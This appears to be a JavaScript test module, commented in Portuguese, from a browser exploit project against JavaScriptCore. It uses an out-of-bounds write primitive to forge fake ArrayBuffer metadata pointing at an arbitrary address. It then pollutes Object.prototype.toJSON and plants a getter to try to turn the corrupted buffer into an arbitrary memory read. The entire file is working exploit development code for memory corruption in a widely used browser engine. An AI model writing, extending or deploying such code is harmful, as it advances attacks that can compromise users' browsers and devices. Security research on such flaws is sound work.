// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real, // A variável global que referencia o ArrayBuffer principal
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForRetypeCheck";
let retype_getter_called_flag = false;
let retype_leak_attempt_results = {};

class CheckpointObjectForRetype {
    constructor(id) {
        this.id = `RetypeCheckpoint-${id}`;
        this.marker = 0xD0D0D0D0;
    }
}

export function toJSON_TriggerRetypeCheckpointGetter() {
    const FNAME_toJSON = "toJSON_TriggerRetypeCheckpointGetter";
    let returned_payload = { _variant_: FNAME_toJSON, _id_at_entry_: String(this?.id || "N/A") };
    try {
        for (const prop in this) {
            if (Object.prototype.hasOwnProperty.call(this, prop) || CheckpointObjectForRetype.prototype.hasOwnProperty(prop)) {
                returned_payload[prop] = this[prop];
            }
        }
    } catch (e) { returned_payload._ERROR_IN_LOOP_ = `${e.name}: ${e.message}`; }
    return returned_payload;
}

export async function executeRetypeOOB_AB_Test() {
    const FNAME_TEST = "executeRetypeOOB_AB_Test";
    logS3(`--- Iniciando Teste: Tentativa de "Re-Tipar" oob_array_buffer_real via Metadados Sombra ---`, "test", FNAME_TEST);
    document.title = `Retype oob_array_buffer_real`;

    if (!JSC_OFFSETS.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID || JSC_OFFSETS.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID !== 2) {
        logS3(`ERRO CRÍTICO: JSC_OFFSETS.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID não é 2 no config.mjs. Teste abortado.`, "error", FNAME_TEST);
        return;
    }
    if (!JSC_OFFSETS.ArrayBuffer?.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START || !JSC_OFFSETS.ArrayBuffer?.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START) {
        logS3(`ERRO CRÍTICO: Offsets para DATA_POINTER_COPY ou SIZE_IN_BYTES não definidos em config.mjs para ArrayBuffer. Teste abortado.`, "error", FNAME_TEST);
        return;
    }


    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha ao configurar ambiente OOB. Teste abortado.", "error", FNAME_TEST);
        return;
    }

    // 1. Definir a estrutura do "ArrayBuffer Sombra" no início do conteúdo do oob_array_buffer_real
    const shadow_structure_id = JSC_OFFSETS.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID; // Deve ser 2
    const shadow_structure_ptr_offset = JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET; // ex: 0x8
    const shadow_size_offset = JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START; // ex: 0x18
    const shadow_data_ptr_offset = JSC_OFFSETS.ArrayBuffer.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START; // ex: 0x20

    const target_arbitrary_read_address = new AdvancedInt64("0x0002000000000000"); // Um endereço de teste para ler
    const arbitrary_read_size = 0x100; // Ler 256 bytes

    logS3(`Escrevendo "Metadados Sombra" no início do conteúdo de oob_array_buffer_real:`, "info", FNAME_TEST);
    logS3(`  Shadow StructureID (${toHex(shadow_structure_id)}) em +0x0`, "info", FNAME_TEST);
    oob_write_absolute(0x0, shadow_structure_id, 4);

    logS3(`  Shadow Structure* (zero) em +${toHex(shadow_structure_ptr_offset)}`, "info", FNAME_TEST);
    oob_write_absolute(shadow_structure_ptr_offset, AdvancedInt64.Zero, 8);

    logS3(`  Shadow Size (${toHex(arbitrary_read_size)}) em +${toHex(shadow_size_offset)}`, "info", FNAME_TEST);
    oob_write_absolute(shadow_size_offset, arbitrary_read_size, 4);

    logS3(`  Shadow DataPointer (${target_arbitrary_read_address.toString(true)}) em +${toHex(shadow_data_ptr_offset)}`, "info", FNAME_TEST);
    oob_write_absolute(shadow_data_ptr_offset, target_arbitrary_read_address, 8);

    // Verificação (opcional, mas bom para confirmar a escrita dos metadados sombra)
    logS3(`Verificando "Metadados Sombra" escritos...`, "info", FNAME_TEST);
    const chk_sid = oob_read_absolute(0x0, 4);
    const chk_sptr = oob_read_absolute(shadow_structure_ptr_offset, 8);
    const chk_size = oob_read_absolute(shadow_size_offset, 4);
    const chk_dptr = oob_read_absolute(shadow_data_ptr_offset, 8);
    if (chk_sid === shadow_structure_id && isAdvancedInt64Object(chk_sptr) && chk_sptr.equals(AdvancedInt64.Zero) &&
        chk_size === arbitrary_read_size && isAdvancedInt64Object(chk_dptr) && chk_dptr.equals(target_arbitrary_read_address)) {
        logS3("  Metadados Sombra parecem ter sido escritos corretamente no conteúdo do oob_array_buffer_real.", "good", FNAME_TEST);
    } else {
        logS3("  AVISO: Discrepância na verificação dos Metadados Sombra.", "warn", FNAME_TEST);
        logS3(`    Lido SID: ${toHex(chk_sid)}, Sptr: ${isAdvancedInt64Object(chk_sptr) ? chk_sptr.toString(true) : toHex(chk_sptr)}, Size: ${toHex(chk_size)}, Dptr: ${isAdvancedInt64Object(chk_dptr) ? chk_dptr.toString(true) : toHex(chk_dptr)}`, "warn");
    }

    // 2. Realizar a corrupção OOB em [0x70] que ativa o getter
    const corruption_offset_trigger = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const corruption_value_trigger = 0xFFFFFFFF;
    logS3(`Escrevendo valor trigger ${toHex(corruption_value_trigger)} em oob_ab_real[${toHex(corruption_offset_trigger)}] para acionar getter...`, "info", FNAME_TEST);
    oob_write_absolute(corruption_offset_trigger, corruption_value_trigger, 4);

    // 3. Configurar e acionar o getter
    let checkpoint_obj = new CheckpointObjectForRetype(0);
    let originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForRetype.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);
    let getterPollutionApplied = false;
    let ppKey_val = 'toJSON';
    let originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let toJSONPollutionApplied = false;

    retype_getter_called_flag = false;
    retype_leak_attempt_results = { success: false, details: "Getter not called or no leak detected." };

    try {
        Object.defineProperty(CheckpointObjectForRetype.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
            get: function() {
                const GETTER_FNAME = "RetypeCheckpointGetter";
                retype_getter_called_flag = true;
                logS3(`!!!! GETTER CHECKPOINT '${GETTER_CHECKPOINT_PROPERTY_NAME}' FOI CHAMADO !!!! (ID: ${this.id})`, "vuln", GETTER_FNAME);
                this.marker = 0xE0E0E0E0;

                retype_leak_attempt_results.getter_called_id = this.id;
                try {
                    logS3(`   [${GETTER_FNAME}] Tentando criar DataView sobre o 'oob_array_buffer_real' global...`, "info", GETTER_FNAME);
                    logS3(`   [${GETTER_FNAME}]   oob_array_buffer_real.byteLength ANTES do new DataView: ${oob_array_buffer_real ? oob_array_buffer_real.byteLength : 'N/A'}`, "info", GETTER_FNAME);

                    const dv = new DataView(oob_array_buffer_real); // Usa a variável global
                    retype_leak_attempt_results.dataview_created = true;

                    logS3(`   [${GETTER_FNAME}]   DataView criada. Tentando ler dv.byteLength: ${dv.byteLength}`, "info", GETTER_FNAME);
                    retype_leak_attempt_results.dataview_byteLength = dv.byteLength;

                    // Tenta ler do offset 0 do buffer (que deve ser target_arbitrary_read_address se a re-tipagem funcionou)
                    const leaked_val = dv.getUint32(0, true);
                    retype_leak_attempt_results.leaked_value_hex = toHex(leaked_val);
                    logS3(`     LEITURA ARBITRÁRIA ESPECULATIVA (via oob_array_buffer_real re-tipado): *(${target_arbitrary_read_address.toString(true)}) leu ${toHex(leaked_val)}`, "critical", GETTER_FNAME);
                    retype_leak_attempt_results.success = true;
                    document.title = "SUCCESS: Arbitrary Read via Retyped OOB_AB!";

                } catch (e_dv_retype) {
                    logS3(`     ERRO ao tentar usar 'oob_array_buffer_real' re-tipado: ${e_dv_retype.name} - ${e_dv_retype.message}`, "error", GETTER_FNAME);
                    retype_leak_attempt_results.error = `${e_dv_retype.name}: ${e_dv_retype.message}`;
                    if (oob_array_buffer_real) {
                         logS3(`       oob_array_buffer_real.byteLength no catch: ${oob_array_buffer_real.byteLength}`, "info", GETTER_FNAME);
                    }
                }
                return "retype_getter_done";
            },
            configurable: true, enumerable: true
        });
        getterPollutionApplied = true;

        Object.defineProperty(Object.prototype, ppKey_val, { value: toJSON_TriggerRetypeCheckpointGetter, writable: true, configurable: true, enumerable: false });
        toJSONPollutionApplied = true;

        logS3(`Tentando acionar getter em CheckpointObjectForRetype para testar oob_array_buffer_real re-tipado...`, "info", FNAME_TEST);
        JSON.stringify(checkpoint_obj);

    } catch (e) {
        logS3(`Erro durante a configuração/execução do getter para re-tipagem: ${e.message}`, "error", FNAME_TEST);
        retype_leak_attempt_results.setup_error = e.message;
    } finally {
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
            else delete Object.prototype[ppKey_val];
        }
        if (getterPollutionApplied && CheckpointObjectForRetype.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) {
            if (originalGetterDesc) Object.defineProperty(CheckpointObjectForRetype.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, originalGetterDesc);
            else delete CheckpointObjectForRetype.prototype[GETTER_CHECKPOINT_PROPERTY_NAME];
        }
    }

    if (retype_getter_called_flag) {
        if (retype_leak_attempt_results.success) {
            logS3("SUCESSO ESPECULATIVO: Leitura arbitrária via oob_array_buffer_real re-tipado parece ter funcionado!", "vuln", FNAME_TEST);
        } else {
            logS3("Getter foi chamado, mas a tentativa de leitura arbitrária falhou ou não foi bem-sucedida.", "warn", FNAME_TEST);
        }
        logS3(`  Detalhes da tentativa de re-tipagem: ${JSON.stringify(retype_leak_attempt_results)}`, "info", FNAME_TEST);
    } else {
        logS3("Getter não foi chamado. A tentativa de re-tipagem não pôde ser verificada.", "warn", FNAME_TEST);
    }

    clearOOBEnvironment();
    logS3(`--- Teste de "Re-Tipagem" de oob_array_buffer_real CONCLUÍDO ---`, "test", FNAME_TEST);
    if (!document.title.includes("SUCCESS")) {
        document.title = `Retype OOB_AB Done`;
    }
}
